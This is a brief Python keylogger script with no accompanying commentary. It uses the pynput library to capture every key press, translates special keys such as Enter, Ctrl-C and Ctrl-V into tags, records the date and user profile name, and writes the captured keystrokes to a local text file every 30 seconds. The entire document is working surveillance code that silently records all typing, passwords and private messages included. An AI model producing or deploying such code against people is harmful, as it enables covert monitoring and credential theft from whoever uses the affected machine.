from pynput.keyboard import Key, Listener
import time
import os
import threading

datetime = time.ctime(time.time())
user = os.path.expanduser('~').split("/")[-1]

substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ', 'Key.alt', '[ALT]',
	            'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 'Key.alt_r', '[ALT]',
	            'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
	            '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
	            '[SUPER]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

title = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n\n'
logs = [title]

def on_press(key):
    key = str(key).strip('\'')
    if key in substitution:
        logs.append(substitution[substitution.index(key)+1])
    else:
        logs.append(key)


def save_log():
    while True:
        time.sleep(30)
        if len(logs) > 1:
            with open('key_log.txt', 'a') as f:
                f.write(''.join(logs))
                logs.clear()
                datetime = time.ctime(time.time())
                logs.append(f'\n\n *~ Date/Time: {datetime}\n\n')

if __name__ == "__main__":
    logThread = threading.Thread(target=save_log)
    logThread.start()

    with Listener(on_press=on_press) as listener:
        listener.join()
